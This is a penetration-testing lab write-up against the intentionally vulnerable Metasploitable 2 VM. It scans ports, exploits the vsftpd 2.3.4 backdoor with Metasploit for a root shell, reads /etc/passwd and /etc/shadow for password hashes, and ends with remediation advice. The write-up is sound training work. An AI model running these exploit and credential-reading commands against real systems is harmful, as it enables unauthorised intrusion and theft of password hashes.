# Metasploitable2
 Basic Pentesting &amp; Exploitation Walkthrough

🎯 Target
Interface: eth0
IP Address: 192.168.83.131
Environment: Metasploitable 2 (Intentionally vulnerable VM)

1. Reconnaissance & Port Scanning
   
A full TCP SYN scan was performed to identify open ports, services, and OS details.

nmap -sS -sV -O 192.168.83.131
🔍 Results Summary:
Host is up and responsive
20+ open ports detected
Multiple outdated and vulnerable services identified
Key exposed services:
FTP: vsftpd 2.3.4
SSH: OpenSSH 4.7p1
Telnet: enabled (insecure)
HTTP: Apache 2.2.8
MySQL: 5.0
PostgreSQL: 8.3
Samba: SMB services exposed
VNC, IRC, Java RMI, Tomcat also exposed

👉 The system has a very large attack surface due to multiple outdated services.

2. Vulnerability Identification

The FTP service was identified as a high-risk target:

searchsploit vsftpd 2.3.4
🔥 Findings:
vsftpd 2.3.4 has a known backdoor vulnerability
Available exploits:
Metasploit module (exploit/unix/ftp/vsftpd_234_backdoor)
Python exploit script
3. Service Confirmation

To validate the target service:

nmap -sV -p21 192.168.83.131
Result:
FTP service confirmed: vsftpd 2.3.4
4. Exploitation (Metasploit)

Metasploit was used to exploit the backdoored FTP service.

msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.83.131
set RPORT 21
run
💥 Result:
Successful exploitation
Reverse shell spawned
Root access obtained immediately
uid=0(root) gid=0(root)

✔ Full system compromise achieved

5. Post-Exploitation
🔎 System verification:
whoami
root

pwd
/
📂 User & system enumeration:
cat /etc/passwd
cat /etc/shadow
Observations:
Multiple system users identified
Password hashes extracted from /etc/shadow
Potential for offline password cracking
6. Data Discovery

Basic enumeration performed:

find / -name "*.txt" 2>/dev/null
find /home -type f
Purpose:
Identify sensitive files
Locate credentials, configs, or hidden data
7. Findings Summary
Category	Status
Initial Access	Successful
Privilege Level	Root
Exploited Service	vsftpd 2.3.4
Impact	Full system compromise
Sensitive Data Access	Yes (/etc/shadow exposed)
8. Security Impact

This system is vulnerable due to:

Outdated services
Exposed unnecessary ports
Lack of firewall restrictions
Known backdoored FTP service
9. Recommendations
Disable FTP or upgrade vsftpd immediately
Close unused ports and services
Disable Telnet (use SSH only)
Patch all outdated services
Implement firewall rules (allow only required ports)
Monitor for unauthorized access
